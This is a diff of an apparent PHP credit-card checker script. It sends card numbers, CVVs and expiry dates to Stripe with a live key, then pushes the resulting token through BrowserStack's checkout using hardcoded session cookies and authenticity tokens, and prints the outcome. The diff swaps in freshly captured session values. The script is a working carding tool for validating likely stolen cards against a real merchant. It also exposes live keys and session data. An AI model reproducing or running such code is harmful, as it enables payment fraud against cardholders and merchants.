@@ -135,7 +135,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d910e15b-4737-4ff5-806c-754cd6023b10216ade&muid=0b0fb6c6-1728-4310-bef1-24670791017bae75da&sid=107f0a2f-a627-4f9f-925f-15e45d31525daebfc8&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=41990&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]=10080&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1e9e7d73-6a20-4464-803a-be1f0b07042b1d397d&muid=1c44198c-cde1-4e21-9bd8-271bc20c2aa70d1f9b&sid=dd109258-da1f-4edc-ab3a-71043a6a34b156c024&payment_user_agent=stripe.js%2Fcf29918aa%3B+stripe-js-v3%2Fcf29918aa&time_on_page=19387&key=pk_live_40g8bjuzvlOrPg0e4GbbFXEBOwi8nvCnSMrwT5IORblarHzU5aYFEaS5QS6pCvJqmjKZTK6fAqyJPNzJ0dytSjW3000N5fu36y3&pasted_fields=number');
 
 
 
@@ -165,7 +165,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'accept: text/javascript, application/json',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: tracking_id=2c05260f-e67b-48be-ad8a-0cc34fa03e1e; moved=1; bs_deviceId=7621522b-218b-baa9-5f9f-8f1727651bf0; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"8dae17bd-75f3-47e8-b783-f95ac4cda189","60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":134,"48":105,"54":116}; ga_pa_status=npa; _session=b07d01737c4298cdfb870d8deb75dce1; bs_logging_id=5949454; bs_group_id=5866654; bs_user_details={"user_details":{"user_id":5949454,"group_id":5866654},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; show_freshchat=2; __cf_bm=NqdahUcYhjIbMO_IvIqpXqUlPP68StVwbXvPlq7uvrw-1649150476-0-AeSBiFQoRCywbKs7SSLNFQUXLvVXpVNO8UKKkrmEa+yFK4eJOfYQF+W0mWHtIiLDshgSlQo4rrOEObY8vywZBvM=; __cfruid=596fbf01e2b384a5ca493f5fb38727b4efc008fa-1649150476; GAstartTime=1649150478111; GAlastSentTime=1649150491401',
+'cookie: tracking_id=bc472f74-a97d-43a7-9221-0390cf0aa05f; moved=1; bs_deviceId=8a0d6119-72bf-48c6-c400-188bc896e669; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"5d0a273b-9f6d-4c36-95ec-52ec1af6eac7","60":129,"40":87,"55":119,"63":133,"48":105,"54":117}; ga_pa_status=npa; p_list=["pricing"]; _session=051efe502b1afd7a04aa29d03e6d319e; bs_logging_id=5953389; bs_group_id=5870595; bs_user_details={"user_details":{"user_id":5953389,"group_id":5870595},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; show_freshchat=2; __cf_bm=t5bQQVDD1JI2c6VSM2QhN6it6zshXwvTB2fhsRaIJnY-1649258536-0-AdZQViv9UiqNvvfsULWdHzlMGzLleOESgLuj8fBv+Jn/4PVpQxJFk0s/pB/WsX32CVK4mZua3xLjgCFLBYxo2Ec=; __cfruid=5b40b35c006ec3fdf3f725b4ccfa3b653cde48c2-1649258536; GAstartTime=1649258544206; GAlastSentTime=1649258591425',
 'origin: https://www.browserstack.com',
 'referer: https://www.browserstack.com/',
 'sec-fetch-dest: empty',
@@ -176,7 +176,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=ku%2Bb%2Bjy3AQkzVsLfBdGO%2BCDfYyqyzZzGFT%2FIe81xEZQ3tTnhkgO92hDtaoOZW3E7gu7IqO0D9IgJJW8udppYJw%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=DmyzzUZ5hC%2BdPqo1QmcsjMgabqWkMl95dBQXV93JJkqrNhHW6M04%2FL6FAmne7dNPaivFJ%2Fv8NzdoDrACZiJv%2BQ%3D%3D');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=wRfcEhSG7jmGVAZ1KzahNsSfBQNMTG%2F4%2FlaLBQPxS8mGqeGT8PsczB4mXNWWnVEPjsdkknWyf2Go%2FIzKeqGn4g%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=ek63QzBfn3fBBKVlAm8AXX9A2wN7JOBM9f6vj5EEKPo98IrC1CJtgll2%2F8W%2FxPBkNRi6kkLa8NWjVKhA6FTE0Q%3D%3D');
 
 
 $result2 = curl_exec($ch);
@@ -440,7 +440,7 @@ else {
 curl_close($ch);
 ob_flush();
 
-echo "<b>Result:</b> $result1<br><br>";
+//echo "<b>Result:</b> $result1<br><br>";
 echo "<b>Result:</b> $result2<br><br>";
 
 ?>
